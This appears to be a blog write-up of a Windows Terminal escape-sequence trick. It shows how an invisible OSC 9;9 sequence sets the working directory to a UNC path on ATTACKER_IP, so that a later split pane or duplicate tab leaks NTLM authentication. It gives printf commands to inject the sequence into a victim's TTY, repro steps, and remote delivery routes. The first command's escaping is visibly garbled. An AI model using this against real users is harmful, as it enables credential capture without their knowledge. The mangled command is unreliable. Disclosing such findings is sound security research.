Was playing with terminal escape sequences and found a neat Windows Terminal behavior.

Windows Terminal supports `OSC 9;9`, which lets terminal output update the current working directory state. If that state is set to a UNC path, then later opening a split pane or duplicate tab can make Windows try to access that UNC path.

That can trigger outbound SMB/WebDAV traffic and NTLM authentication.

## The Trick

A terminal output stream can send this:

```bash
printf '\\\\x1b]9;9;\\\\\\\\\\\\\\\\ATTACKER\\\_IP\\\\\\\\share\\\\x1b\\\\\\\\' > /dev/pts/2
```

The UNC path does not visibly print in the victim terminal.

Later, if the victim uses one of these normal Windows Terminal actions:

```text
Alt+Shift+D   split pane
Ctrl+Shift+D  duplicate tab
```

Windows Terminal may reuse the attacker-controlled working directory.

Since the working directory is a UNC path, Windows tries to resolve it and may authenticate to the remote host.

## Why It Is Interesting

The weird part is the flow:

```text
remote terminal output
        ↓
Windows Terminal working directory state
        ↓
split pane / duplicate tab
        ↓
Windows path resolution
        ↓
NTLM authentication
```

The victim does not type the UNC path.

The victim does not click the UNC path.

The escape sequence is invisible.

The later user action is normal terminal usage.

## Quick Repro

Open Windows Terminal and start a WSL or SSH session.

Find the victim TTY:

```bash
who
```

Example:

```text
frost pts/1 2026-04-30 11:09
```

From another terminal that can write to that TTY:

```bash
printf '\x1b]9;9;\\\\ATTACKER_IP\\share\x1b\\' > /dev/pts/2
```

Then, in the victim Windows Terminal pane, press:

```text
Alt+Shift+D
```

or:

```text
Ctrl+Shift+D
```

Watch the attacker-controlled SMB/WebDAV/DNS listener.



## Remote Angle

This is not limited to someone manually writing to `/dev/pts/\\\\\\\*`.

Any place where an attacker can print bytes into the victim's terminal is interesting:

```text
SSH banner/output
malicious server output
log output
build output
CLI tool output
compromised remote host
```

So the useful mental model is:

```text
If attacker-controlled text reaches your Windows Terminal, it may be able to change terminal state.
```

In this case, that state can later become a Windows working directory.



## Notes

This was mostly a fun terminal escape sequence finding.

The interesting bit is that invisible remote terminal output can influence local Windows Terminal state, and that state can later cause Windows to authenticate to a remote UNC path.

